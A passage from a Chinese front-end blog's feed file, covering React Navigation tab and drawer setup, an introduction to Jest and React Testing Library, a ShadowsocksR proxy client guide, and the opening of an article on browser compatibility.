class_">MovieDetail</span>: <span class="title class_">MovieDetail</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">initialRouteName</span>: <span class="string">&#x27;MovieHome&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">RootStack</span> = <span class="title function_">createStackNavigator</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">Movie</span>: &#123;</span><br><span class="line">      <span class="attr">screen</span>: <span class="title class_">MovieStack</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title class_">Modal</span>: &#123;</span><br><span class="line">      <span class="attr">screen</span>: <span class="title class_">ModalPage</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">initialRouteName</span>: <span class="string">&#x27;Movie&#x27;</span>,</span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;modal&#x27;</span>, <span class="comment">// modal 与 card 在定义上以及部分手机系统的动画上可能会有区分</span></span><br><span class="line">    <span class="attr">headerMode</span>: <span class="string">&#x27;none&#x27;</span>, <span class="comment">// 如果 headerMode 在这里设置为可见，那么 MovieStack 的 Header 将被遮挡住</span></span><br><span class="line">  &#125;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AppContainer</span> = <span class="title function_">createAppContainer</span>(<span class="title class_">RootStack</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">AppContainer</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://i.loli.net/2020/07/18/IsQPgeDojzTaNvi.gif" alt="1.gif"></p><h1 id="7-标签导航-TabNavigator"><a href="#7-标签导航-TabNavigator" class="headerlink" title="7. 标签导航 TabNavigator"></a>7. 标签导航 TabNavigator</h1><blockquote><p><a href="https://reactnavigation.org/docs/4.x/tab-based-navigation">https://reactnavigation.org/docs/4.x/tab-based-navigation</a></p></blockquote><p>移动应用中最常见的导航样式可能是基于标签的导航。它可以是屏幕底部的标题，也可以是标题下方的顶部（甚至代替标题）。</p><p>要想使用标签导航，那么首先需要安装 <code>react-navigation-stack</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yarn add react-navigation-stack</span><br></pre></td></tr></table></figure><p>创建一个底部导航栏：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">MovieStack</span> = <span class="title function_">createStackNavigator</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">MovieHome</span>: <span class="title class_">MovieHome</span></span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">UserStack</span> = <span class="title function_">createStackNavigator</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">UserHome</span>: <span class="title class_">UserHome</span></span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">BottomNavigator</span> = <span class="title function_">createBottomTabNavigator</span>(&#123;</span><br><span class="line">  <span class="title class_">Movie</span>: <span class="title class_">MovieStack</span>,</span><br><span class="line">  <span class="title class_">User</span>: <span class="title class_">UserStack</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AppContainer</span> = <span class="title function_">createAppContainer</span>(<span class="title class_">BottomNavigator</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">AppContainer</span> /&gt;</span></span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/07/18/TPizk87GfgU65vF.png" alt=""></p><p>当然我们想指定底部导航栏的样式以及 Icon 也是可以的，可以参考该章节的官方文档。</p><h1 id="8-抽屉导航-DrawerNavigator"><a href="#8-抽屉导航-DrawerNavigator" class="headerlink" title="8. 抽屉导航 DrawerNavigator"></a>8. 抽屉导航 DrawerNavigator</h1><blockquote><p><a href="https://reactnavigation.org/docs/4.x/drawer-based-navigation">https://reactnavigation.org/docs/4.x/drawer-based-navigation</a></p></blockquote><p>抽屉导航就是用户从屏幕左侧向内滑动而展开的侧边抽屉，通常这个页面用于导航到其他页面所使用，要想使用该方式用作页面导航，那么首先要安装依赖：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yarn add react-navigation-drawer</span><br></pre></td></tr></table></figure><p>之后我们可以使用 Drawer 导航来控制页面的路由：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">MovieStack</span> = <span class="title function_">createStackNavigator</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">MovieHome</span>: <span class="title class_">MovieHome</span></span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">UserStack</span> = <span class="title function_">createStackNavigator</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">UserHome</span>: <span class="title class_">UserHome</span></span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">DrawerNavigator</span> = <span class="title function_">createDrawerNavigator</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">Movie</span>: <span class="title class_">MovieStack</span>,</span><br><span class="line">    <span class="title class_">User</span>: <span class="title class_">UserStack</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AppContainer</span> = <span class="title function_">createAppContainer</span>(<span class="title class_">BottomNavigator</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">AppContainer</span> /&gt;</span></span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><p><strong>特别注意!!!</strong></p><p>引入了 Drawer Navigator 后，滑动展开 Drawer 的动作是不起效的，如果想让其生效，则必须安装 <code>react-native-gesture-handler</code>，同时在 <code>index.js</code> 中使用 <code>react-native-gesture-handler</code> 的 <code>gestureHandlerRootHOC</code> 来包裹整个 APP 组件，这样才会生效：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  import &#123;AppRegistry&#125; from &#x27;react-native&#x27;;</span><br><span class="line">  import App from &#x27;./App&#x27;;</span><br><span class="line">  import &#123;name as appName&#125; from &#x27;./app.json&#x27;;</span><br><span class="line"><span class="addition">+ import &#123;gestureHandlerRootHOC&#125; from &#x27;react-native-gesture-handler&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">- AppRegistry.registerComponent(appName, () =&gt; App);</span></span><br><span class="line"><span class="addition">+ AppRegistry.registerComponent(appName, () =&gt; gestureHandlerRootHOC(App));</span></span><br></pre></td></tr></table></figure><blockquote><p>引用参考：<a href="https://stackoverflow.com/questions/53394982/react-navigation-swipe-on-drawer-does-not-work-in-android">https://stackoverflow.com/questions/53394982/react-navigation-swipe-on-drawer-does-not-work-in-android</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 快速使用 </tag>
            
            <tag> ReactNative </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 测试工具简单介绍与使用</title>
      <link href="/2020/07/475492237388.html"/>
      <url>/2020/07/475492237388.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-通用测试工具-Jest"><a href="#1-通用测试工具-Jest" class="headerlink" title="1. 通用测试工具 Jest"></a>1. 通用测试工具 Jest</h1><blockquote><p>Jest 是一个 JavaScript 测试运行器。它允许你使用 jsdom 操作 DOM 。尽管 jsdom 只是对浏览器工作表现的一个近似模拟，对测试 React 组件来说它通常也已经够用了。Jest 有着十分优秀的迭代速度，同时还提供了若干强大的功能，比如它可以模拟 modules 和 timers 让你更精细的控制代码如何执行。</p></blockquote><h2 id="1-1-启动测试"><a href="#1-1-启动测试" class="headerlink" title="1.1 启动测试"></a>1.1 启动测试</h2><p>create-react-app 中内置了 jest ，我们可以直接使用 <code>npx</code> 来执行测试指令。</p><p>全局运行 jest 指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npx jest</span><br></pre></td></tr></table></figure><p>如果要测试单个文件，运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npx jest xxx.js</span><br></pre></td></tr></table></figure><p>测试某个文件并开启监听修改：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npx jest xxx.js --watch</span><br></pre></td></tr></table></figure><h2 id="1-2-使用断言进行测试"><a href="#1-2-使用断言进行测试" class="headerlink" title="1.2 使用断言进行测试"></a>1.2 使用断言进行测试</h2><p>使用 <code>toBe()</code> 测试结果是否符合预期：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">test</span>(<span class="string">&quot;test common matcher&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">expect</span>(<span class="number">2</span> + <span class="number">2</span>).<span class="title function_">toBe</span>(<span class="number">4</span>);</span><br><span class="line">  <span class="title function_">expect</span>(<span class="number">2</span> + <span class="number">2</span>).<span class="property">not</span>.<span class="title function_">toBe</span>(<span class="number">6</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用 <code>toBeTruthy()</code> 与 <code>toBeFalsy()</code> 测试布尔值结果是否符合预期：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">test</span>(<span class="string">&quot;test not to be true or false&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">expect</span>(<span class="number">1</span>).<span class="title function_">toBeTruthy</span>();</span><br><span class="line">  <span class="title function_">expect</span>(<span class="number">0</span>).<span class="title function_">toBeFalsy</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用 <code>toBeGreaterThan()</code> 与 <code>toBeLessThan()</code> 比较数字结果大小：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">test</span>(<span class="string">&quot;test number&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">expect</span>(<span class="number">4</span>).<span class="title function_">toBeGreaterThan</span>(<span class="number">3</span>);</span><br><span class="line">  <span class="title function_">expect</span>(<span class="number">2</span>).<span class="title function_">toBeLessThan</span>(<span class="number">3</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用 <code>toEqual()</code> 测试结果值是否相等，可以用来判断对象结果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">test</span>(<span class="string">&quot;test object&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">expect</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;esunr&quot;</span> &#125;.<span class="title function_">toEqual</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;esunr&quot;</span> &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="2-React-测试库"><a href="#2-React-测试库" class="headerlink" title="2. React 测试库"></a>2. React 测试库</h1><blockquote><p>React 测试库是一组能让你不依赖 React 组件具体实现对他们进行测试的辅助工具。它让重构工作变得轻而易举，还会推动你拥抱有关无障碍的最佳实践。虽然它不能让你省略子元素来浅（shallowly）渲染一个组件，但像 Jest 这样的测试运行器可以通过 mocking 让你做到。</p></blockquote><p>最新版本的 create-react-app 内置了 @testing-library/react 可以用来专门进行 React 测试。</p><p>jest 会自动对以下文件运行测试：</p><ol><li><code>__tests__</code> 文件夹下的 <code>.js</code> 文件</li><li>以 <code>.test.js</code> 为后缀的文件</li><li>以 <code>.spec.js</code> 为后缀的文件</li></ol><blockquote><p>jest 不仅支持 ts 文件还支持 ts 文件</p></blockquote><p>因此我们可以在组件文件夹下创建 <code>Button.test.tsx</code> 文件作为 Button 组件的测试文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; render &#125; <span class="keyword">from</span> <span class="string">&quot;@testing-library/react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Button</span> <span class="keyword">from</span> <span class="string">&quot;./button&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&quot;first test&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> wrapper = <span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">Button</span>&gt;</span>Nice<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span>);</span><br><span class="line">  <span class="keyword">const</span> element = wrapper.<span class="title function_">queryByText</span>(<span class="string">&quot;Nice&quot;</span>);</span><br><span class="line">  <span class="title function_">expect</span>(element).<span class="title function_">toBeTruthy</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="3-jest-dom"><a href="#3-jest-dom" class="headerlink" title="3. jest-dom"></a>3. jest-dom</h1><p>jest-dom 是 test library 开发的测试工具，可以为 jest 断言库添加更多的针对 dom 的断言，最新版本的 create-react-app 已经内置了这一工具。</p><p>create-react-app 支持在 src 目录下创建 <code>setupTests.ts</code> 文件，在运行 <code>npm run test</code> 时首先执行该文件。，因此可以用来在做测试前存放全局的通用文件。</p><p>要使用 jest-dom 首先要在 <code>setupTests.ts</code> 将其引入：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// setupTests.ts</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@testing-library/jest-dom/extend-expect&quot;</span>;</span><br></pre></td></tr></table></figure><p>之后我们便可以在测试中使用 jest-dom 的断言库：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; render &#125; <span class="keyword">from</span> <span class="string">&quot;@testing-library/react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Button</span> <span class="keyword">from</span> <span class="string">&quot;./button&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&quot;first test&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> wrapper = <span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">Button</span>&gt;</span>Nice<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span>);</span><br><span class="line">  <span class="keyword">const</span> element = wrapper.<span class="title function_">queryByText</span>(<span class="string">&quot;Nice&quot;</span>);</span><br><span class="line">  <span class="comment">// expect(element).toBeTruthy();</span></span><br><span class="line">  <span class="title function_">expect</span>(element).<span class="title function_">toBeInTheDocument</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
            <tag> Jest </tag>
            
            <tag> 软件测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ShadowSocksR使用教程</title>
      <link href="/2020/06/37a4efa38b28.html"/>
      <url>/2020/06/37a4efa38b28.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-原理概述"><a href="#1-原理概述" class="headerlink" title="1. 原理概述"></a>1. 原理概述</h1><p>Shadowsocks 的运行原理与其他代理工具基本相同，使用特定的中转服务器完成数据传输。 例如，用户无法直接访问Google，但代理服务器可以访问，且用户可以直接连接代理服务器，那么用户就可以通过特定软件连接代理服务器，然后由代理服务器获取网站内容并回传给用户，从而实现代理上网的效果。</p><p><img src="https://bingtaoli.github.io/2016/11/23/shadowsocks%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/shadowsocks.png" alt=""></p><h1 id="2-使用步骤"><a href="#2-使用步骤" class="headerlink" title="2. 使用步骤"></a>2. 使用步骤</h1><blockquote><p>以 Windwos PC 端为示例，ShadowSocksR 简称 SSR</p></blockquote><h2 id="2-1-安装-ShadowSocksR-客户端"><a href="#2-1-安装-ShadowSocksR-客户端" class="headerlink" title="2.1 安装 ShadowSocksR 客户端"></a>2.1 安装 ShadowSocksR 客户端</h2><p>个个客户端的下载链接：</p><ul><li><a href="http://23.91.23.40:8080/Maying.apk">安卓</a></li><li><a href="https://github.com/shadowsocksrr/shadowsocksr-csharp/releases/tag/4.8.0">Windows</a></li><li><a href="https://github.com/qinyuhang/ShadowsocksX-NG-R/releases">Mac</a></li></ul><h2 id="2-2-添加节点"><a href="#2-2-添加节点" class="headerlink" title="2.2 添加节点"></a>2.2 添加节点</h2><p>在购买 SSR 账号后，首先会收到一个以 <code>ssr://</code> 开头的一串字符，这是 ssr 节点的一个节点链接，复制到剪切板之后需要导入到 SSR 中才可以使用，以下是导入步骤：</p><p>打开 ShadowSocksR 客户端，其会运行在右下角的托盘中：</p><p><img src="http://study.esunr.xyz/1592976584516.png" alt=""></p><p>对小飞机图标右键，选择 <code>从剪切板批量导入ssr://链接</code>：</p><p><img src="http://study.esunr.xyz/1592977097117.png" alt=""></p><p>之后就会在节点列表中看见如下节点：</p><p><img src="http://study.esunr.xyz/1592976952971.png" alt=""></p><p>点击该节点后该节点就被标记为启动状态，此时可以使用浏览器测试是否可以访问外网。</p><h2 id="2-3-设置系统代理模式"><a href="#2-3-设置系统代理模式" class="headerlink" title="2.3 设置系统代理模式"></a>2.3 设置系统代理模式</h2><p>SSR 提供了多种代理模式，可以通过 “右键-系统代理模式” 菜单进行选择，其中常用的有全局模式与PAC模式。</p><p><img src="http://study.esunr.xyz/1592977883928.png" alt=""></p><p>在全局模式下，网络中的所有流量都会被 SSR 所接管进行转发，访问外网会进行加速，这是 SSR 默认启用的模式。但是如果国内流量也交给 SSR 的话，就可能会出现访问国内网站速度减慢甚至无法访问的情况。</p><p>为了避免上述的情况，SSR 提供了 PAC 模式，在该模式下，SSR 会根据定制的 PAC 规则来决定当前流量是否由代理进行转发。我们可以在 “右键-PAC” 选项中设置 PAC 的规则，这里推荐将 PAC 规则设置为 <code>更新PAC为GFWList</code>，在这个规则下，只有访问被墙的网站时才会使用代理访问。</p><p><img src="http://study.esunr.xyz/1592977839737.png" alt=""></p><p>此外，代理规则最好设置为绕过局域网和大陆：</p><p><img src="http://study.esunr.xyz/1592977801746.png" alt=""></p><h2 id="2-4-使用订阅自动导入节点"><a href="#2-4-使用订阅自动导入节点" class="headerlink" title="2.4 使用订阅自动导入节点"></a>2.4 使用订阅自动导入节点</h2><p>经过刚才的操作，仅仅只导入了一个节点，所购买的 SSR 运营商账号下通常包含多个节点，在 SSR 运行的过程中会自动选择最优节点进行接入（也可以手动选择），这样有助于提升网速。我们可以使用订阅来导入这些节点。</p><p>首先登录 SSR 运营商平台：<a href="https://cp.dawangidc.com/">https://cp.dawangidc.com/</a> </p><p>查看购买的服务：</p><p><img src="http://study.esunr.xyz/1592978420665.png" alt=""></p><p>在订阅信息中复制两个地址中的其中一个：</p><p><img src="http://study.esunr.xyz/1592978502022.png" alt=""></p><p>选择设置服务器订阅信息：</p><p><img src="http://study.esunr.xyz/1592978550277.png" alt=""></p><p>将原有的订阅删除，并新建一个订阅，网址处输入刚才复制的订阅地址：</p><p><img src="http://study.esunr.xyz/1592978597721.png" alt=""></p><p>点击确定后会自动更新订阅，如果没有更新，就在服务器订阅选项中选择 <code>更新SSR服务器订阅</code> 来手动更新订阅。更新成功后会收到提醒：</p><p><img src="http://study.esunr.xyz/1592978774898.png" alt=""></p><p>此时，SSR 节点列表中就会出现刚才所添加成功的节点，如下：</p><p><img src="http://study.esunr.xyz/1592978930396.png" alt=""></p><p>当当前节点速度缓慢时，可以手动切换节点，通常使用香港（hk）节点、俄罗斯（ru）阶段、韩国（kr）节点、法国（fr）节点速度比较快。</p><p>And then, enjoy.</p><h1 id="3-Q-amp-A"><a href="#3-Q-amp-A" class="headerlink" title="3. Q&amp;A"></a>3. Q&amp;A</h1><h2 id="3-1-会被封吗？"><a href="#3-1-会被封吗？" class="headerlink" title="3.1 会被封吗？"></a>3.1 会被封吗？</h2><p>通常不会，除非特殊时期时会被禁止使用，请留意官方信息。</p><h2 id="3-2-跟-VPN-有何区别？"><a href="#3-2-跟-VPN-有何区别？" class="headerlink" title="3.2 跟 VPN 有何区别？"></a>3.2 跟 VPN 有何区别？</h2><p>原理上区别很大，但实际使用上无任何差别，VPN 网络商业化需要资质，SSR 本质只是借用一个远程服务器服务器对流量进行转发，并非 VPN 组网所以成本低。</p><h2 id="3-3-有线宽带无法使用？"><a href="#3-3-有线宽带无法使用？" class="headerlink" title="3.3 有线宽带无法使用？"></a>3.3 有线宽带无法使用？</h2><p>是的，有线方式连接宽带会造成 SSR 无法正常使用，Chrome 使用 switchyomega 插件手动设置代理可以解决。</p><h2 id="3-4-如何为其他软件设置-SSR-代理？"><a href="#3-4-如何为其他软件设置-SSR-代理？" class="headerlink" title="3.4 如何为其他软件设置 SSR 代理？"></a>3.4 如何为其他软件设置 SSR 代理？</h2><p>软件的网络代理地址设置为 <code>127.0.0.1:1080</code> 那么该软件的流量就会走 SSR。</p><h2 id="3-5-我可以在哪些平台使用-SSR？"><a href="#3-5-我可以在哪些平台使用-SSR？" class="headerlink" title="3.5 我可以在哪些平台使用 SSR？"></a>3.5 我可以在哪些平台使用 SSR？</h2><p>几乎所有主流设备，甚至路由器。</p><h2 id="3-6-可以作为游戏加速器使用吗？"><a href="#3-6-可以作为游戏加速器使用吗？" class="headerlink" title="3.6 可以作为游戏加速器使用吗？"></a>3.6 可以作为游戏加速器使用吗？</h2><p>可以，但是效果不好。</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浏览器常见的兼容性问题以及解决方案</title>
      <link href="/2020/06/562519fda23a.html"/>
      <url>/2020/06/562519fda23a.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>本文前半部分将主要展示各主流浏览器的内核版本情况，HTML5以及CSS3的支持情况，以及开发过程中常见的兼容性问题。后半部分则将会从工程化的角度上来考虑如何解决这些问题，并提出向下兼容的方案。</p><blockquote><p>Tips：文档内 “+” 均表示大于等于，如 IE9+ 即代表 IE 版本号大于等于 9。</p></blockquote><h1 id="2-国内主流浏览器内核版本"><a href="#2-国内主流浏览器内核版本" class="headerlink" title="2. 国内主流浏览器内核版本"></a>2. 国内主流浏览器内核版本</h1><p>对于国内的情况而言，大多数用户会使用主流大厂提供的浏览器，同时对于部分机房环境则使用了系统默认的 IE 浏览器，因此在下面的列表中整理了IE浏览器以及主流国产浏览器对于浏览器内核的版本使用情况，同时附带了各浏览器版本的发布时间：</p><blockquote><p>Tips: 部分国产浏览较早之前的浏览器使用了 Webkit 内核，但是由于受 Chrome 转向使用了 Blink 内核的影响，因此国产浏览器也逐渐放弃使用了 Webkit 内核，目前为止，国内主流的浏览器均使用了 Chromium 内核来作为底层内核（<a href="[https://zh.wikipedia.org/wiki/Chromium#%E9%9D%9E%E5%AE%98%E6%96%B9%E4%BF%AE%E6%94%B9%E7%89%88](https://zh.wikipedia.org/wiki/Chromium#非官方修改版)">引用参考</a>），只是内核版本不同。</p></blockquote><ul><li>Internet Explore<ul><li>IE6 2001</li><li>IE7 2006（Windows XP SP3、Windows Vista）</li><li>IE8 2009（Windows7）</li><li>IE9 2011</li><li>IE10 2011（Windows 8）</li><li>IE11 2013（Windows8.1、Windows 10）</li></ul></li><li>QQ 浏览器（基于Chromium开发，针对IE内核优化）<ul><li>v10.0 2020（Chromium70 &amp; IE 10）</li><li>v9.6 2017（Chromium53）</li><li>v9.3 2016（Chromium47）</li><li>v9.0 2015（Chromium43 &amp; IE 8）</li><li>v7.0 2012（Webkit）</li></ul></li><li>360极速浏览器（双核）<ul><li>v12.0 2020 （Chromium78）</li></ul></li><li>360安全浏览器（双核）<ul><li>v12.1 2020 （Chromium78）</li><li>v6.0 2015（Chromium45）</li></ul></li><li>搜狗浏览器（双核）<ul><li>v8.0 2020 （Chromium65）</li></ul></li><li>猎豹浏览器（双核）<ul><li>v6.5 2017（Chromium57）</li></ul></li><li>Edge<ul><li>旧版本 （Trident 7 / IE 11）</li><li>2020 年正式版（Chromium83）</li></ul></li></ul><h1 id="3-Javascript-兼容性问题"><a href="#3-Javascript-兼容性问题" class="headerlink" title="3. Javascript 兼容性问题"></a>3. Javascript 兼容性问题</h1><h2 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h2><h3 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h3><p><img src="http://img.cdn.esunr.xyz/markdown/20200603194101.png" alt=""></p><p>对于原生 XMLHttpRequest 支持 IE6+ 的浏览器，如果需要在 IE6 上支持 XMLHttpRequest 对象，则需要使用 <a href="https://developer.mozilla.org/zh-CN/docs/Archive/Web/JavaScript/Microsoft_Extensions/ActiveXObject">ActiveXObject</a> 对象做兼容。</p><p>关于跨域，IE10+ 才支持 ResponseHeader Access-Control-Allow-Origin（<a href="[https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9%E6%80%A7](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS#浏览器兼容性)">完整兼容性参考</a>），低版本浏览器可以使用 JSONP 方案进行跨域。</p><p>关于基于 XMLHttpRequest 而构建的 <a href="https://github.com/axios/axios">Axios</a> 使用了 Promise，因此在不支持 ES6 版本的浏览器上使用时需要添加 Promise 的语法垫片。</p><h3 id="Fetch-API"><a href="#Fetch-API" class="headerlink" title="Fetch API"></a>Fetch API</h3><p><img src="http://img.cdn.esunr.xyz/markdown/20200603194004.png" alt=""></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch API</a> 提供了一个 JavaScript 接口，用于访问和操纵 HTTP 管道的一些具体部分，需要注意其实一个实验性特征，且 IE 所有版本均不支持。</p><h3 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h3><p><img src="http://img.cdn.esunr.xyz/markdown/20200605163344.png" alt=""></p><p>在 IE10+ 